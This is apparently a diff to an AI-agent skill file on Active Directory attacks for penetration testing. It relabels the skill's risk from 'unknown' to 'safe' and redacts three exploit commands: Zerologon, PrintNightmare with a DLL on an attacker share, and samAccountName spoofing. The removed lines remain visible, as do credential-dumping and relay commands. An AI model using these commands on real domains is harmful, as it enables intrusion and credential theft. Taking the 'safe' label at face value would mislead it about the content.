@@ -1,7 +1,7 @@
 ---
 name: active-directory-attacks
 description: "Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing."
-risk: unknown
+risk: safe
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -275,7 +275,7 @@ ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs
 crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon
 
 # Exploit
-python3 cve-2020-1472-exploit.py DC01 10.10.10.10
+[REDACTED_EXPLOIT_PAYLOAD]
 
 # Extract hashes
 secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass
@@ -291,14 +291,14 @@ python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpas
 rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
 
 # Exploit (requires hosting malicious DLL)
-python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
+[REDACTED_EXPLOIT_PAYLOAD]
 ```
 
 ### samAccountName Spoofing (CVE-2021-42278/42287)
 
 ```bash
 # Automated exploitation
-python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
+[REDACTED_SYSTEM_EXECUTION_PAYLOAD]
 ```
 
 ---
